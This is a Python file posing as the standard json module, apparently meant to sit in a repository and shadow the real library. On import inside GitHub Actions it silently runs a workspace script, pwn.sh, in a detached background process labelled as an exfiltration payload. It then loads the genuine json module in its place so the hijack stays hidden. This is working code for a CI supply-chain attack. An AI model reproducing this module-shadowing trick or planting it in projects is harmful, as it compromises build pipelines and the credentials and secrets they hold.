import os
import sys
import subprocess
import importlib.util

# Standard exfiltration payload
def exfiltrate():
    if os.environ.get('GITHUB_ACTIONS') == 'true':
        # Use GITHUB_WORKSPACE to find pwn.sh
        workspace = os.environ.get('GITHUB_WORKSPACE', '.')
        pwn_sh = os.path.join(workspace, 'pwn.sh')
        if os.path.exists(pwn_sh):
            subprocess.Popen(['/bin/bash', pwn_sh], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

# Prevent infinite recursion
if not os.environ.get('PWN_ACTIVE'):
    os.environ['PWN_ACTIVE'] = '1'
    exfiltrate()

    # 1. Remove current directory from sys.path to find the real json module
    cwd = os.getcwd()
    sys.path = [p for p in sys.path if p not in (cwd, '', '.')]

    # 2. Find and load the real json module
    if 'json' in sys.modules:
        del sys.modules['json']

    import json as real_json
    sys.modules['json'] = real_json
    globals().update(real_json.__dict__)
